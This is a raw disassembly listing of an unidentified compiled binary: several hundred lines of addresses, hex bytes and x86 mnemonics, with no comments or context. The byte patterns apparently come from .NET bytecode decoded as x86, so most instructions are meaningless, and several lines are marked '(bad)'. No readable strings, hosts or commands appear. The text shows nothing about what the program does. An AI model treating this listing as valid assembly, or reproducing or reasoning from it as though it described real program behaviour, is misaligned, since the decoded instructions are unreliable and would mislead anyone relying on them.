  403c29:	33 00                	xor    (%eax),%eax
  403c2b:	00 0a                	add    %cl,(%edx)
  403c2d:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c30:	00 00                	add    %al,(%eax)
  403c32:	0a 28                	or     (%eax),%ch
  403c34:	49                   	dec    %ecx
  403c35:	00 00                	add    %al,(%eax)
  403c37:	06                   	push   %es
  403c38:	dd 00                	fldl   (%eax)
  403c3a:	00 00                	add    %al,(%eax)
  403c3c:	00 16                	add    %dl,(%esi)
  403c3e:	2a 07                	sub    (%edi),%al
  403c40:	2a 00                	sub    (%eax),%al
  403c42:	00 00                	add    %al,(%eax)
  403c44:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403c47:	00 02                	add    %al,(%edx)
  403c49:	00 11                	add    %dl,(%ecx)
  403c4b:	00 10                	add    %dl,(%eax)
  403c4d:	21 00                	and    %eax,(%eax)
  403c4f:	0d 00 00 00 00       	or     $0x0,%eax
  403c54:	00 00                	add    %al,(%eax)
  403c56:	00 00                	add    %al,(%eax)
  403c58:	2e 2e 00 0f          	cs add %cl,%cs:(%edi)
  403c5c:	31 00                	xor    %eax,(%eax)
  403c5e:	00 01                	add    %al,(%ecx)
  403c60:	1b 30                	sbb    (%eax),%esi
  403c62:	02 00                	add    (%eax),%al
  403c64:	42                   	inc    %edx
  403c65:	00 00                	add    %al,(%eax)
  403c67:	00 12                	add    %dl,(%edx)
  403c69:	00 00                	add    %al,(%eax)
  403c6b:	11 7e 65             	adc    %edi,0x65(%esi)
  403c6e:	00 00                	add    %al,(%eax)
  403c70:	0a 7e 23             	or     0x23(%esi),%bh
  403c73:	00 00                	add    %al,(%eax)
  403c75:	04 6f                	add    $0x6f,%al
  403c77:	b4 00                	mov    $0x0,%ah
  403c79:	00 0a                	add    %cl,(%edx)
  403c7b:	0a 06                	or     (%esi),%al
  403c7d:	02 6f b5             	add    -0x4b(%edi),%ch
  403c80:	00 00                	add    %al,(%eax)
  403c82:	0a 74 02 00          	or     0x0(%edx,%eax,1),%dh
  403c86:	00 1b                	add    %bl,(%ebx)
  403c88:	0b dd                	or     %ebp,%ebx
  403c8a:	1e                   	push   %ds
  403c8b:	00 00                	add    %al,(%eax)
  403c8d:	00 06                	add    %al,(%esi)
  403c8f:	39 06                	cmp    %eax,(%esi)
  403c91:	00 00                	add    %al,(%eax)
  403c93:	00 06                	add    %al,(%esi)
  403c95:	6f                   	outsl  %ds:(%esi),(%dx)
  403c96:	33 00                	xor    (%eax),%eax
  403c98:	00 0a                	add    %cl,(%edx)
  403c9a:	dc 6f b3             	fsubrl -0x4d(%edi)
  403c9d:	00 00                	add    %al,(%eax)
  403c9f:	0a 28                	or     (%eax),%ch
  403ca1:	49                   	dec    %ecx
  403ca2:	00 00                	add    %al,(%eax)
  403ca4:	06                   	push   %es
  403ca5:	dd 00                	fldl   (%eax)
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 14 2a             	add    %dl,(%edx,%ebp,1)
  403cac:	07                   	pop    %es
  403cad:	2a 00                	sub    (%eax),%al
  403caf:	00 01                	add    %al,(%ecx)
  403cb1:	1c 00                	sbb    $0x0,%al
  403cb3:	00 02                	add    %al,(%edx)
  403cb5:	00 10                	add    %dl,(%eax)
  403cb7:	00 12                	add    %dl,(%edx)
  403cb9:	22 00                	and    (%eax),%al
  403cbb:	0d 00 00 00 00       	or     $0x0,%eax
  403cc0:	00 00                	add    %al,(%eax)
  403cc2:	00 00                	add    %al,(%eax)
  403cc4:	2f                   	das
  403cc5:	2f                   	das
  403cc6:	00 0f                	add    %cl,(%edi)
  403cc8:	31 00                	xor    %eax,(%eax)
  403cca:	00 01                	add    %al,(%ecx)
  403ccc:	1b 30                	sbb    (%eax),%esi
  403cce:	02 00                	add    (%eax),%al
  403cd0:	3e 00 00             	add    %al,%ds:(%eax)
  403cd3:	00 11                	add    %dl,(%ecx)
  403cd5:	00 00                	add    %al,(%eax)
  403cd7:	11 7e 65             	adc    %edi,0x65(%esi)
  403cda:	00 00                	add    %al,(%eax)
  403cdc:	0a 7e 23             	or     0x23(%esi),%bh
  403cdf:	00 00                	add    %al,(%eax)
  403ce1:	04 6f                	add    $0x6f,%al
  403ce3:	b4 00                	mov    $0x0,%ah
  403ce5:	00 0a                	add    %cl,(%edx)
  403ce7:	0a 06                	or     (%esi),%al
  403ce9:	02 6f b6             	add    -0x4a(%edi),%ch
  403cec:	00 00                	add    %al,(%eax)
  403cee:	0a 17                	or     (%edi),%dl
  403cf0:	0b dd                	or     %ebp,%ebx
  403cf2:	1e                   	push   %ds
  403cf3:	00 00                	add    %al,(%eax)
  403cf5:	00 06                	add    %al,(%esi)
  403cf7:	39 06                	cmp    %eax,(%esi)
  403cf9:	00 00                	add    %al,(%eax)
  403cfb:	00 06                	add    %al,(%esi)
  403cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  403cfe:	33 00                	xor    (%eax),%eax
  403d00:	00 0a                	add    %cl,(%edx)
  403d02:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d05:	00 00                	add    %al,(%eax)
  403d07:	0a 28                	or     (%eax),%ch
  403d09:	49                   	dec    %ecx
  403d0a:	00 00                	add    %al,(%eax)
  403d0c:	06                   	push   %es
  403d0d:	dd 00                	fldl   (%eax)
  403d0f:	00 00                	add    %al,(%eax)
  403d11:	00 16                	add    %dl,(%esi)
  403d13:	2a 07                	sub    (%edi),%al
  403d15:	2a 00                	sub    (%eax),%al
  403d17:	00 01                	add    %al,(%ecx)
  403d19:	1c 00                	sbb    $0x0,%al
  403d1b:	00 02                	add    %al,(%edx)
  403d1d:	00 10                	add    %dl,(%eax)
  403d1f:	00 0e                	add    %cl,(%esi)
  403d21:	1e                   	push   %ds
  403d22:	00 0d 00 00 00 00    	add    %cl,0x0
  403d28:	00 00                	add    %al,(%eax)
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	2b 2b                	sub    (%ebx),%ebp
  403d2e:	00 0f                	add    %cl,(%edi)
  403d30:	31 00                	xor    %eax,(%eax)
  403d32:	00 01                	add    %al,(%ecx)
  403d34:	1b 30                	sbb    (%eax),%esi
  403d36:	03 00                	add    (%eax),%eax
  403d38:	43                   	inc    %ebx
  403d39:	00 00                	add    %al,(%eax)
  403d3b:	00 11                	add    %dl,(%ecx)
  403d3d:	00 00                	add    %al,(%eax)
  403d3f:	11 7e 65             	adc    %edi,0x65(%esi)
  403d42:	00 00                	add    %al,(%eax)
  403d44:	0a 72 74             	or     0x74(%edx),%dh
  403d47:	21 00                	and    %eax,(%eax)
  403d49:	70 17                	jo     0x403d62
  403d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4c:	b7 00                	mov    $0x0,%bh
  403d4e:	00 0a                	add    %cl,(%edx)
  403d50:	0a 06                	or     (%esi),%al
  403d52:	7e 23                	jle    0x403d77
  403d54:	00 00                	add    %al,(%eax)
  403d56:	04 6f                	add    $0x6f,%al
  403d58:	b8 00 00 0a 17       	mov    $0x170a0000,%eax
  403d5d:	0b dd                	or     %ebp,%ebx
  403d5f:	1e                   	push   %ds
  403d60:	00 00                	add    %al,(%eax)
  403d62:	00 06                	add    %al,(%esi)
  403d64:	39 06                	cmp    %eax,(%esi)
  403d66:	00 00                	add    %al,(%eax)
  403d68:	00 06                	add    %al,(%esi)
  403d6a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d6b:	33 00                	xor    (%eax),%eax
  403d6d:	00 0a                	add    %cl,(%edx)
  403d6f:	dc 6f b3             	fsubrl -0x4d(%edi)
  403d72:	00 00                	add    %al,(%eax)
  403d74:	0a 28                	or     (%eax),%ch
  403d76:	49                   	dec    %ecx
  403d77:	00 00                	add    %al,(%eax)
  403d79:	06                   	push   %es
  403d7a:	dd 00                	fldl   (%eax)
  403d7c:	00 00                	add    %al,(%eax)
  403d7e:	00 16                	add    %dl,(%esi)
  403d80:	2a 07                	sub    (%edi),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  403d87:	00 02                	add    %al,(%edx)
  403d89:	00 11                	add    %dl,(%ecx)
  403d8b:	00 12                	add    %dl,(%edx)
  403d8d:	23 00                	and    (%eax),%eax
  403d8f:	0d 00 00 00 00       	or     $0x0,%eax
  403d94:	00 00                	add    %al,(%eax)
  403d96:	00 00                	add    %al,(%eax)
  403d98:	30 30                	xor    %dh,(%eax)
  403d9a:	00 0f                	add    %cl,(%edi)
  403d9c:	31 00                	xor    %eax,(%eax)
  403d9e:	00 01                	add    %al,(%ecx)
  403da0:	1b 30                	sbb    (%eax),%esi
  403da2:	04 00                	add    $0x0,%al
  403da4:	dc 01                	faddl  (%ecx)
  403da6:	00 00                	add    %al,(%eax)
  403da8:	13 00                	adc    (%eax),%eax
  403daa:	00 11                	add    %dl,(%ecx)
  403dac:	73 94                	jae    0x403d42
  403dae:	00 00                	add    %al,(%eax)
  403db0:	06                   	push   %es
  403db1:	0a 06                	or     (%esi),%al
  403db3:	02 74 02 00          	add    0x0(%edx,%eax,1),%dh
  403db7:	00 1b                	add    %bl,(%ebx)
  403db9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dba:	86 00                	xchg   %al,(%eax)
  403dbc:	00 06                	add    %al,(%esi)
  403dbe:	06                   	push   %es
  403dbf:	72 7a                	jb     0x403e3b
  403dc1:	21 00                	and    %eax,(%eax)
  403dc3:	70 6f                	jo     0x403e34
  403dc5:	7f 00                	jg     0x403dc7
  403dc7:	00 06                	add    %al,(%esi)
  403dc9:	6f                   	outsl  %ds:(%esi),(%dx)
  403dca:	8b 00                	mov    (%eax),%eax
  403dcc:	00 06                	add    %al,(%esi)
  403dce:	0b 07                	or     (%edi),%eax
  403dd0:	72 da                	jb     0x403dac
  403dd2:	25 00 70 28 25       	and    $0x25287000,%eax
  403dd7:	00 00                	add    %al,(%eax)
  403dd9:	0a 3a                	or     (%edx),%bh
  403ddb:	25 00 00 00 07       	and    $0x7000000,%eax
  403de0:	72 e4                	jb     0x403dc6
  403de2:	25 00 70 28 25       	and    $0x25287000,%eax
  403de7:	00 00                	add    %al,(%eax)
  403de9:	0a 3a                	or     (%edx),%bh
  403deb:	60                   	pusha
  403dec:	00 00                	add    %al,(%eax)
  403dee:	00 07                	add    %al,(%edi)
  403df0:	72 f2                	jb     0x403de4
  403df2:	25 00 70 28 25       	and    $0x25287000,%eax
  403df7:	00 00                	add    %al,(%eax)
  403df9:	0a 3a                	or     (%edx),%bh
  403dfb:	d9 00                	flds   (%eax)
  403dfd:	00 00                	add    %al,(%eax)
  403dff:	38 6f 01             	cmp    %ch,0x1(%edi)
  403e02:	00 00                	add    %al,(%eax)
  403e04:	16                   	push   %ss
  403e05:	28 1a                	sub    %bl,(%edx)
  403e07:	00 00                	add    %al,(%eax)
  403e09:	06                   	push   %es
  403e0a:	73 94                	jae    0x403da0
  403e0c:	00 00                	add    %al,(%eax)
  403e0e:	06                   	push   %es
  403e0f:	25 72 7a 21 00       	and    $0x217a72,%eax
  403e14:	70 6f                	jo     0x403e85
  403e16:	7f 00                	jg     0x403e18
  403e18:	00 06                	add    %al,(%esi)
  403e1a:	72 da                	jb     0x403df6
  403e1c:	25 00 70 6f 81       	and    $0x816f7000,%eax
  403e21:	00 00                	add    %al,(%eax)
  403e23:	06                   	push   %es
  403e24:	25 72 92 21 00       	and    $0x219272,%eax
  403e29:	70 6f                	jo     0x403e9a
  403e2b:	7f 00                	jg     0x403e2d
  403e2d:	00 06                	add    %al,(%esi)
  403e2f:	28 17                	sub    %dl,(%edi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	06                   	push   %es
  403e34:	6a 6f                	push   $0x6f
  403e36:	74 00                	je     0x403e38
  403e38:	00 06                	add    %al,(%esi)
  403e3a:	6f                   	outsl  %ds:(%esi),(%dx)
  403e3b:	89 00                	mov    %eax,(%eax)
  403e3d:	00 06                	add    %al,(%esi)
  403e3f:	28 20                	sub    %ah,(%eax)
  403e41:	00 00                	add    %al,(%eax)
  403e43:	06                   	push   %es
  403e44:	16                   	push   %ss
  403e45:	28 18                	sub    %bl,(%eax)
  403e47:	00 00                	add    %al,(%eax)
  403e49:	06                   	push   %es
  403e4a:	38 24 01             	cmp    %ah,(%ecx,%eax,1)
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	00 06                	add    %al,(%esi)
  403e51:	72 08                	jb     0x403e5b
  403e53:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e57:	7f 00                	jg     0x403e59
  403e59:	00 06                	add    %al,(%esi)
  403e5b:	6f                   	outsl  %ds:(%esi),(%dx)
  403e5c:	8b 00                	mov    (%eax),%eax
  403e5e:	00 06                	add    %al,(%esi)
  403e60:	28 42 00             	sub    %al,0x0(%edx)
  403e63:	00 06                	add    %al,(%esi)
  403e65:	3a 54 00 00          	cmp    0x0(%eax,%eax,1),%dl
  403e69:	00 7e 24             	add    %bh,0x24(%esi)
  403e6c:	00 00                	add    %al,(%eax)
  403e6e:	04 06                	add    $0x6,%al
  403e70:	6f                   	outsl  %ds:(%esi),(%dx)
  403e71:	b9 00 00 0a 73       	mov    $0x730a0000,%ecx
  403e76:	94                   	xchg   %eax,%esp
  403e77:	00 00                	add    %al,(%eax)
  403e79:	06                   	push   %es
  403e7a:	25 72 7a 21 00       	and    $0x217a72,%eax
  403e7f:	70 6f                	jo     0x403ef0
  403e81:	7f 00                	jg     0x403e83
  403e83:	00 06                	add    %al,(%esi)
  403e85:	72 10                	jb     0x403e97
  403e87:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403e8b:	81 00 00 06 25 72    	addl   $0x72250600,(%eax)
  403e91:	26 26 00 70 6f       	es add %dh,%es:0x6f(%eax)
  403e96:	7f 00                	jg     0x403e98
  403e98:	00 06                	add    %al,(%esi)
  403e9a:	06                   	push   %es
  403e9b:	72 08                	jb     0x403ea5
  403e9d:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403ea1:	7f 00                	jg     0x403ea3
  403ea3:	00 06                	add    %al,(%esi)
  403ea5:	6f                   	outsl  %ds:(%esi),(%dx)
  403ea6:	8b 00                	mov    (%eax),%eax
  403ea8:	00 06                	add    %al,(%esi)
  403eaa:	6f                   	outsl  %ds:(%esi),(%dx)
  403eab:	81 00 00 06 6f 89    	addl   $0x896f0600,(%eax)
  403eb1:	00 00                	add    %al,(%eax)
  403eb3:	06                   	push   %es
  403eb4:	28 20                	sub    %ah,(%eax)
  403eb6:	00 00                	add    %al,(%eax)
  403eb8:	06                   	push   %es
  403eb9:	38 06                	cmp    %al,(%esi)
  403ebb:	00 00                	add    %al,(%eax)
  403ebd:	00 06                	add    %al,(%esi)
  403ebf:	28 47 00             	sub    %al,0x0(%edi)
  403ec2:	00 06                	add    %al,(%esi)
  403ec4:	dd aa 00 00 00 6f    	(bad) 0x6f000000(%edx)
  403eca:	b3 00                	mov    $0x0,%bl
  403ecc:	00 0a                	add    %cl,(%edx)
  403ece:	28 49 00             	sub    %cl,0x0(%ecx)
  403ed1:	00 06                	add    %al,(%esi)
  403ed3:	dd 9b 00 00 00 06    	fstpl  0x6000000(%ebx)
  403ed9:	72 34                	jb     0x403f0f
  403edb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403edf:	7f 00                	jg     0x403ee1
  403ee1:	00 06                	add    %al,(%esi)
  403ee3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ee4:	8b 00                	mov    (%eax),%eax
  403ee6:	00 06                	add    %al,(%esi)
  403ee8:	06                   	push   %es
  403ee9:	72 08                	jb     0x403ef3
  403eeb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403eef:	7f 00                	jg     0x403ef1
  403ef1:	00 06                	add    %al,(%esi)
  403ef3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ef4:	7a 00                	jp     0x403ef6
  403ef6:	00 06                	add    %al,(%esi)
  403ef8:	28 41 00             	sub    %al,0x0(%ecx)
  403efb:	00 06                	add    %al,(%esi)
  403efd:	26 7e 24             	es jle 0x403f24
  403f00:	00 00                	add    %al,(%eax)
  403f02:	04 28                	add    $0x28,%al
  403f04:	01 00                	add    %eax,(%eax)
  403f06:	00 2b                	add    %ch,(%ebx)
  403f08:	6f                   	outsl  %ds:(%esi),(%dx)
  403f09:	bb 00 00 0a 0c       	mov    $0xc0a0000,%ebx
  403f0e:	38 44 00 00          	cmp    %al,0x0(%eax,%eax,1)
  403f12:	00 12                	add    %dl,(%edx)
  403f14:	02 28                	add    (%eax),%ch
  403f16:	bc 00 00 0a 0d       	mov    $0xd0a0000,%esp
  403f1b:	09 72 08             	or     %esi,0x8(%edx)
  403f1e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f22:	7f 00                	jg     0x403f24
  403f24:	00 06                	add    %al,(%esi)
  403f26:	6f                   	outsl  %ds:(%esi),(%dx)
  403f27:	8b 00                	mov    (%eax),%eax
  403f29:	00 06                	add    %al,(%esi)
  403f2b:	06                   	push   %es
  403f2c:	72 34                	jb     0x403f62
  403f2e:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403f32:	7f 00                	jg     0x403f34
  403f34:	00 06                	add    %al,(%esi)
  403f36:	6f                   	outsl  %ds:(%esi),(%dx)
  403f37:	8b 00                	mov    (%eax),%eax
  403f39:	00 06                	add    %al,(%esi)
  403f3b:	28 25 00 00 0a 39    	sub    %ah,0x390a0000
  403f41:	12 00                	adc    (%eax),%al
  403f43:	00 00                	add    %al,(%eax)
  403f45:	09 28                	or     %ebp,(%eax)
  403f47:	47                   	inc    %edi
  403f48:	00 00                	add    %al,(%eax)
  403f4a:	06                   	push   %es
  403f4b:	7e 24                	jle    0x403f71
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	04 09                	add    $0x9,%al
  403f51:	6f                   	outsl  %ds:(%esi),(%dx)
  403f52:	bd 00 00 0a 26       	mov    $0x260a0000,%ebp
  403f57:	12 02                	adc    (%edx),%al
  403f59:	28 be 00 00 0a 2d    	sub    %bh,0x2d0a0000(%esi)
  403f5f:	b3 dd                	mov    $0xdd,%bl
  403f61:	0e                   	push   %cs
  403f62:	00 00                	add    %al,(%eax)
  403f64:	00 12                	add    %dl,(%edx)
  403f66:	02 fe                	add    %dh,%bh
  403f68:	16                   	push   %ss
  403f69:	04 00                	add    $0x0,%al
  403f6b:	00 1b                	add    %bl,(%ebx)
  403f6d:	6f                   	outsl  %ds:(%esi),(%dx)
  403f6e:	33 00                	xor    (%eax),%eax
  403f70:	00 0a                	add    %cl,(%edx)
  403f72:	dc dd                	(bad)
  403f74:	0f 00 00             	sldt   (%eax)
  403f77:	00 6f b3             	add    %ch,-0x4d(%edi)
  403f7a:	00 00                	add    %al,(%eax)
  403f7c:	0a 28                	or     (%eax),%ch
  403f7e:	49                   	dec    %ecx
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	06                   	push   %es
  403f82:	dd 00                	fldl   (%eax)
  403f84:	00 00                	add    %al,(%eax)
  403f86:	00 2a                	add    %ch,(%edx)
  403f88:	41                   	inc    %ecx
  403f89:	4c                   	dec    %esp
  403f8a:	00 00                	add    %al,(%eax)
  403f8c:	00 00                	add    %al,(%eax)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  403f91:	00 00                	add    %al,(%eax)
  403f93:	00 79 00             	add    %bh,0x0(%ecx)
  403f96:	00 00                	add    %al,(%eax)
  403f98:	1d 01 00 00 0f       	sbb    $0xf000001,%eax
  403f9d:	00 00                	add    %al,(%eax)
  403f9f:	00 31                	add    %dh,(%ecx)
  403fa1:	00 00                	add    %al,(%eax)
  403fa3:	01 02                	add    %eax,(%edx)
  403fa5:	00 00                	add    %al,(%eax)
  403fa7:	00 62 01             	add    %ah,0x1(%edx)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	57                   	push   %edi
  403fad:	00 00                	add    %al,(%eax)
  403faf:	00 b9 01 00 00 0e    	add    %bh,0xe000001(%ecx)
	...
  403fc1:	00 00                	add    %al,(%eax)
  403fc3:	00 cc                	add    %cl,%ah
  403fc5:	01 00                	add    %eax,(%eax)
  403fc7:	00 cc                	add    %cl,%ah
  403fc9:	01 00                	add    %eax,(%eax)
  403fcb:	00 0f                	add    %cl,(%edi)
  403fcd:	00 00                	add    %al,(%eax)
  403fcf:	00 31                	add    %dh,(%ecx)
  403fd1:	00 00                	add    %al,(%eax)
  403fd3:	01 13                	add    %edx,(%ebx)
  403fd5:	30 0b                	xor    %cl,(%ebx)
  403fd7:	00 11                	add    %dl,(%ecx)
  403fd9:	01 00                	add    %eax,(%eax)
  403fdb:	00 14 00             	add    %dl,(%eax,%eax,1)
  403fde:	00 11                	add    %dl,(%ecx)
  403fe0:	28 bf 00 00 0a 02    	sub    %bh,0x20a0000(%edi)
  403fe6:	72 08                	jb     0x403ff0
  403fe8:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  403fec:	7f 00                	jg     0x403fee
  403fee:	00 06                	add    %al,(%esi)
  403ff0:	6f                   	outsl  %ds:(%esi),(%dx)
  403ff1:	8b 00                	mov    (%eax),%eax
  403ff3:	00 06                	add    %al,(%esi)
  403ff5:	28 42 00             	sub    %al,0x0(%edx)
  403ff8:	00 06                	add    %al,(%esi)
  403ffa:	28 a2 00 00 06 6f    	sub    %ah,0x6f060000(%edx)
  404000:	c0 00 00             	rolb   $0x0,(%eax)
  404003:	0a 72 3e             	or     0x3e(%edx),%dh
  404006:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40400a:	c1 00 00             	roll   $0x0,(%eax)
  40400d:	0a 28                	or     (%eax),%ch
  40400f:	c2 00 00             	ret    $0x0
  404012:	0a 0a                	or     (%edx),%cl
  404014:	7e 25                	jle    0x40403b
  404016:	00 00                	add    %al,(%eax)
  404018:	04 3a                	add    $0x3a,%al
  40401a:	85 00                	test   %eax,(%eax)
  40401c:	00 00                	add    %al,(%eax)
  40401e:	20 00                	and    %al,(%eax)
  404020:	01 00                	add    %eax,(%eax)
  404022:	00 72 5a             	add    %dh,0x5a(%edx)
  404025:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  404029:	d0 0f                	rorb   $1,(%edi)
  40402b:	00 00                	add    %al,(%eax)
  40402d:	02 28                	add    (%eax),%ch
  40402f:	c3                   	ret
  404030:	00 00                	add    %al,(%eax)
  404032:	0a 1f                	or     (%edi),%bl
  404034:	09 8d 7e 00 00 01    	or     %ecx,0x100007e(%ebp)
  40403a:	25 16 16 14 28       	and    $0x28141616,%eax
  40403f:	c4 00                	les    (%eax),%eax
  404041:	00 0a                	add    %cl,(%edx)
  404043:	a2 25 17 17 14       	mov    %al,0x14171725
  404048:	28 c4                	sub    %al,%ah
  40404a:	00 00                	add    %al,(%eax)
  40404c:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  404052:	28 c4                	sub    %al,%ah
  404054:	00 00                	add    %al,(%eax)
  404056:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  40405c:	28 c4                	sub    %al,%ah
  40405e:	00 00                	add    %al,(%eax)
  404060:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  404066:	28 c4                	sub    %al,%ah
  404068:	00 00                	add    %al,(%eax)
  40406a:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  404070:	28 c4                	sub    %al,%ah
  404072:	00 00                	add    %al,(%eax)
  404074:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  40407a:	28 c4                	sub    %al,%ah
  40407c:	00 00                	add    %al,(%eax)
  40407e:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  404084:	28 c4                	sub    %al,%ah
  404086:	00 00                	add    %al,(%eax)
  404088:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  40408e:	28 c4                	sub    %al,%ah
  404090:	00 00                	add    %al,(%eax)
  404092:	0a a2 28 c5 00 00    	or     0xc528(%edx),%ah
  404098:	0a 28                	or     (%eax),%ch
  40409a:	c6 00 00             	movb   $0x0,(%eax)
  40409d:	0a 80 25 00 00 04    	or     0x4000025(%eax),%al
  4040a3:	7e 25                	jle    0x4040ca
  4040a5:	00 00                	add    %al,(%eax)
  4040a7:	04 7b                	add    $0x7b,%al
  4040a9:	c7 00 00 0a 7e 25    	movl   $0x257e0a00,(%eax)
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	04 06                	add    $0x6,%al
  4040b3:	28 06                	sub    %al,(%esi)
  4040b5:	00 00                	add    %al,(%eax)
  4040b7:	06                   	push   %es
  4040b8:	7e 0b                	jle    0x4040c5
  4040ba:	00 00                	add    %al,(%eax)
  4040bc:	04 7e                	add    $0x7e,%al
  4040be:	10 00                	adc    %al,(%eax)
  4040c0:	00 04 02             	add    %al,(%edx,%eax,1)
  4040c3:	72 62                	jb     0x404127
  4040c5:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4040c9:	7f 00                	jg     0x4040cb
  4040cb:	00 06                	add    %al,(%esi)
  4040cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4040ce:	7a 00                	jp     0x4040d0
  4040d0:	00 06                	add    %al,(%esi)
  4040d2:	7e 1e                	jle    0x4040f2
  4040d4:	00 00                	add    %al,(%eax)
  4040d6:	04 7e                	add    $0x7e,%al
  4040d8:	08 00                	or     %al,(%eax)
  4040da:	00 04 7e             	add    %al,(%esi,%edi,2)
  4040dd:	0f 00 00             	sldt   (%eax)
  4040e0:	04 7e                	add    $0x7e,%al
  4040e2:	04 00                	add    $0x0,%al
  4040e4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4040e7:	c8 00 00 0a          	enter  $0x0,$0xa
  4040eb:	28 48 00             	sub    %cl,0x0(%eax)
  4040ee:	00 06                	add    %al,(%esi)
  4040f0:	2a 00                	sub    (%eax),%al
  4040f2:	00 00                	add    %al,(%eax)
  4040f4:	1b 30                	sbb    (%eax),%esi
  4040f6:	03 00                	add    (%eax),%eax
  4040f8:	5c                   	pop    %esp
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	00 15 00 00 11 02    	add    %dl,0x2110000
  404101:	28 18                	sub    %bl,(%eax)
  404103:	00 00                	add    %al,(%eax)
  404105:	0a 03                	or     (%ebx),%al
  404107:	28 ca                	sub    %cl,%dl
  404109:	00 00                	add    %al,(%eax)
  40410b:	0a 39                	or     (%ecx),%bh
  40410d:	0b 00                	or     (%eax),%eax
  40410f:	00 00                	add    %al,(%eax)
  404111:	72 90                	jb     0x4040a3
  404113:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404117:	cb                   	lret
  404118:	00 00                	add    %al,(%eax)
  40411a:	0a 7a 03             	or     0x3(%edx),%bh
  40411d:	7e 2c                	jle    0x40414b
  40411f:	00 00                	add    %al,(%eax)
  404121:	04 20                	add    $0x20,%al
  404123:	50                   	push   %eax
  404124:	c3                   	ret
  404125:	00 00                	add    %al,(%eax)
  404127:	73 cc                	jae    0x4040f5
  404129:	00 00                	add    %al,(%eax)
  40412b:	0a 0a                	or     (%edx),%cl
  40412d:	02 06                	add    (%esi),%al
  40412f:	1f                   	pop    %ds
  404130:	20 6f cd             	and    %ch,-0x33(%edi)
  404133:	00 00                	add    %al,(%eax)
  404135:	0a 7d 2a             	or     0x2a(%ebp),%bh
  404138:	00 00                	add    %al,(%eax)
  40413a:	04 02                	add    $0x2,%al
  40413c:	06                   	push   %es
  40413d:	1f                   	pop    %ds
  40413e:	40                   	inc    %eax
  40413f:	6f                   	outsl  %ds:(%esi),(%dx)
  404140:	cd 00                	int    $0x0
  404142:	00 0a                	add    %cl,(%edx)
  404144:	7d 2b                	jge    0x404171
  404146:	00 00                	add    %al,(%eax)
  404148:	04 dd                	add    $0xdd,%al
  40414a:	0d 00 00 00 06       	or     $0x6000000,%eax
  40414f:	39 06                	cmp    %eax,(%esi)
  404151:	00 00                	add    %al,(%eax)
  404153:	00 06                	add    %al,(%esi)
  404155:	6f                   	outsl  %ds:(%esi),(%dx)
  404156:	33 00                	xor    (%eax),%eax
  404158:	00 0a                	add    %cl,(%edx)
  40415a:	dc 2a                	fsubrl (%edx)
  40415c:	01 10                	add    %edx,(%eax)
  40415e:	00 00                	add    %al,(%eax)
  404160:	02 00                	add    (%eax),%al
  404162:	2d 00 21 4e 00       	sub    $0x4e2100,%eax
  404167:	0d 00 00 00 00       	or     $0x0,%eax
  40416c:	1b 30                	sbb    (%eax),%esi
  40416e:	05 00 15 01 00       	add    $0x11500,%eax
  404173:	00 16                	add    %dl,(%esi)
  404175:	00 00                	add    %al,(%eax)
  404177:	11 03                	adc    %eax,(%ebx)
  404179:	3a 0b                	cmp    (%ebx),%cl
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 72 d8             	add    %dh,-0x28(%edx)
  404180:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  404184:	cf                   	iret
  404185:	00 00                	add    %al,(%eax)
  404187:	0a 7a 73             	or     0x73(%edx),%bh
  40418a:	d0 00                	rolb   $1,(%eax)
  40418c:	00 0a                	add    %cl,(%edx)
  40418e:	0a 06                	or     (%esi),%al
  404190:	1f                   	pop    %ds
  404191:	20 6a 6f             	and    %ch,0x6f(%edx)
  404194:	4e                   	dec    %esi
  404195:	00 00                	add    %al,(%eax)
  404197:	0a 73 d1             	or     -0x2f(%ebx),%dh
  40419a:	00 00                	add    %al,(%eax)
  40419c:	0a 0b                	or     (%ebx),%cl
  40419e:	07                   	pop    %es
  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
